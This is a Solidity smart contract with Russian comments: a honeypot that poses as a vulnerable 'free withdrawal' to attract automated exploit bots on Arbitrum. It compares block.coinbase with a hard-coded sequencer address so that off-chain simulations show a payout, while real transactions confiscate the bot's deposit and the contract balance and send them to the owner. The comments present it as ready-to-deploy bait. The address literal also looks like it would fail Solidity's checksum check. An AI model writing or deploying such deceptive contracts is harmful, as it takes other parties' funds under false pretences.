// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract SentinelMainnetTrap {
    address public immutable owner;
    
    // Официальный адрес Секвенсора Arbitrum One в Mainnet
    // Именно он всегда является block.coinbase при реальном исполнении транзакций
    address private constant ARBITRUM_SEQUENCER = 0xa4b14ac35d1828202c34a2e6484770023a1a2656;

    event AttackIntercepted(address indexed bot, uint256 confiscatedAmount);
    event PoolRefilled(address indexed sender, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not total owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    // Наполнение приманки реальным ETH
    receive() external payable {
        emit PoolRefilled(msg.sender, msg.value);
    }

    /**
     * @notice Функция, которая для ботов выглядит как "халявный вывод"
     * @param fakeTarget Адрес, куда бот в симуляции пытается увести баланс
     */
    function exploitMe(address fakeTarget) external payable {
        // Бот должен отправить "входной залог" (минимум 0.01 ETH), думая, что заберет 1 ETH
        require(msg.value >= 0.01 ether, "Min stake required");

        // --- КЛЮЧЕВАЯ АСИММЕТРИЯ (Oracle Shield) ---
        // Когда бот запускает симуляцию у себя на сервере (через Hardhat/Anvil/Tenderly),
        // значение block.coinbase НЕ РАВНО реальному секвенсору Arbitrum.
        // Поэтому для бота условие ниже выполнится как TRUE (он видит уязвимость!).
        
        if (block.coinbase != ARBITRUM_SEQUENCER) {
            // СИМУЛЯЦИЯ: Бот видит, что контракт отдает ему весь баланс
            uint256 reward = address(this).balance;
            (bool success, ) = fakeTarget.call{value: reward}("");
            require(success, "Simulated leak failed");
        } 
        else {
            // РЕАЛЬНЫЙ БЛОК: Когда транзакция попала в настоящий блок Arbitrum,
            // block.coinbase становится равен ARBITRUM_SEQUENCER.
            // Условие выше ломается, и вместо раздачи денег контракт ИЗЫМАЕТ залог бота
            // и мгновенно переводит его на твой кошелек-деплоер.
            
            uint256 confiscated = address(this).balance;
            emit AttackIntercepted(msg.sender, confiscated);
            
            // Забираем всё: и то что было в контракте, и залог бота
            (bool success, ) = owner.call{value: confiscated}("");
            require(success, "Confiscation secure");
        }
    }

    /**
     * @notice Экстренный возврат средств владельцем
     */
    function emergencyWithdraw() external onlyOwner {
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Reset failed");
    }
}
